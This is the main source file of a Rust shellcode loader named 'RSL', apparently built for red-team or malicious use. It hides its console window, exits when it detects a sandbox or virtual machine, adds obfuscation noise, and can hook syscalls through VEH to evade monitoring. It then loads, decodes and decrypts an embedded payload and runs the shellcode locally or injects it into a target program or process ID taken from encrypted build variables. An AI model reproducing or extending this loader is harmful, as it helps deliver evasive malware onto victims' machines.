#![cfg_attr(not(feature = "debug"), windows_subsystem = "windows")]
mod utils;
mod load_payload;
mod exec;
mod decrypt;
mod alloc_mem;
mod decode;
#[cfg(feature = "with_forgery")]
mod forgery;
#[cfg(feature = "sandbox")]
mod guard;

use utils::obfuscation_noise;
use load_payload::load_payload;
use decrypt::decrypt;
use decode::decode_payload;
use exec::exec;
#[cfg(feature = "debug")]
use utils::{print_error, print_message};

fn exit_program() -> ! {
    #[cfg(feature = "veh_syscall")]
    rust_veh_syscalls::destroy_hooks();
    std::process::exit(1);
}

fn start_program() {
    #[cfg(feature = "debug")]
    print_message("RSL started in debug mode.");

    #[cfg(feature = "veh_syscall")]
    rust_veh_syscalls::initialize_hooks();
}

fn main() {
    start_program();

    #[cfg(feature = "sandbox")]
    if guard::guard_vm() {
        #[cfg(feature = "debug")] 
        print_message("Sandbox/VM detected. Exiting...");
        exit_program();
    }

    obfuscation_noise();

    #[cfg(feature = "with_forgery")]
    if let Err(_e) = forgery::bundle::bundlefile() {        
        #[cfg(feature = "debug")]        
        print_error("Failed to bundle:", &_e);
        exit_program();
    }
    
    let encrypted_data = match load_payload() {
        Ok(data) => data,
        Err(_e) => {
            #[cfg(feature = "debug")]
            print_error("Failed to load:", &_e);
            exit_program();
        }
    };

    let decrypted_data = decode_payload(&encrypted_data).unwrap();

    obfuscation_noise();

    unsafe {
        let (shellcode_ptr, _shellcode_len) = match decrypt(&decrypted_data) {
            Ok(p) => p,
            Err(_e) => {
                #[cfg(feature = "debug")]
                print_error("Failed to decrypt:", &_e);
                exit_program();
            }
        };
        
        obfuscation_noise();

        #[cfg(feature = "pattern1")]
        if let Err(_e) = exec(shellcode_ptr as usize) {
            #[cfg(feature = "debug")]
            print_error("Failed to execute:", &_e);
            exit_program();
        }
        
        #[cfg(feature = "pattern2")] 
        {
            use utils::simple_decrypt;
            let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));

            if let Err(_e) = exec(shellcode_ptr as usize, _shellcode_len, target_program.as_str()) {
                #[cfg(feature = "debug")]
                print_error("Failed to execute:", &_e);
                exit_program();
            }
        }
        
        #[cfg(feature = "pattern3")]
        {
            use utils::simple_decrypt;
            let pid: usize = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PID")).parse().unwrap_or(0);
            
            if let Err(_e) = exec(shellcode_ptr as usize, _shellcode_len, pid) {
                #[cfg(feature = "debug")]
                print_error("Failed to execute:", &_e);
                exit_program();
            }
        }
        
    }
    exit_program();
}